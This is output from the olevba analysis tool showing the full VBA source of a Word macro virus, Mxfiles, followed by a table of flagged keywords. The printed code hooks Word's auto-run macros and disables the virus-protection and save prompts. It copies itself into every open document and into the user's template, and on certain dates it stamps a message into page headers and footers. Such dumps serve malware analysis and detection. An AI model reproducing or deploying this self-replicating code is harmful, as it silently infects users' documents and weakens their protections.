olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mxfiles-9e68302b81570a591b0c8fa5bfeb70d5a54b819d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mxfiles-9e68302b81570a591b0c8fa5bfeb70d5a54b819d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Mxfile.bas 
in file: Virus.MSWord.Mxfiles-9e68302b81570a591b0c8fa5bfeb70d5a54b819d - OLE stream: 'Macros/VBA/Mxfile'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub toolsmacro()
Mxfiles
End Sub
Sub Autoexit()
Mxfiles
End Sub
Sub Autoexec()
Mxfiles
End Sub
Sub Autonew()
Mxfiles
End Sub
Sub AutoOpen()
Mxfiles
End Sub
Sub Openshell()
Mxfiles
End Sub

Sub Mxfiles()
txt = " åÐÇ ÇáÝíÑæÓ ÚÑÖ æÛíÑ ÖÇÑ æßá ãÇíÞæã Èå ßÊÇÈå ÚÈÇÑÉ ßáäÇ äÈÇíÚ ãÈÇÑß"
On Error Resume Next
Application.ScreenUpdating = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
ddorg = ThisDocument.FullName
For a = 1 To Documents.Count
If Documents.Item(a).Path <> "" Then
dest = Documents.Item(a).FullName
SetAttr dest, vbNormal
Else
dest = Documents.Item(a).Name
End If
If ddorg <> dest Then
Application.OrganizerCopy Source:=ddorg, Destination:=dest, Name:="Mxfile", Object:=wdOrganizerObjectProjectItems
If Documents.Item(a).Path <> "" Then
Documents.Item(a).Save
End If
End If
dd = Documents.Item(a).AttachedTemplate
dd1 = Options.DefaultFilePath(Path:=wdUserTemplatesPath)
dd2 = dd1 + "\" + dd
SetAttr dd2, vbNormal
If ddorg <> dd2 Then
Application.OrganizerCopy Source:=ddorg, Destination:=dd2, Name:="Mxfile", Object:=wdOrganizerObjectProjectItems
End If
Next a
ff$ = GetSetting(appname:="network", Section:="unix", Key:="mxfile")
If Val(ff$) = 255 Then
Application.ScreenUpdating = True
Exit Sub
End If
dayn = Format(Date, "dd")
Monthn = Format(Date, "mm")
reg = dayn Mod Monthn
If reg = 0 And dayn > 10 Then
If ActiveWindow.ActivePane.View.Type <> wdPageView Then
View = ActiveWindow.ActivePane.View.Type
ActiveWindow.ActivePane.View.Type = wdPageView
End If
 ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageHeader
  Selection.EndKey Unit:=wdLine, Extend:=wdExtend
  Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
  Selection.TypeText Text:=Right(txt, 16)
  ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageFooter
  Selection.EndKey Unit:=wdLine, Extend:=wdExtend
  Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
  Selection.TypeText Text:=Right(txt, 16)
  ActiveWindow.ActivePane.View.SeekView = wdSeekMainDocument
ActiveWindow.ActivePane.View.Type = View
End If
Application.ScreenUpdating = True
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Autoexit            |Runs when the Word document is closed        |
|AutoExec  |Autonew             |Runs when a new Word document is created     |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

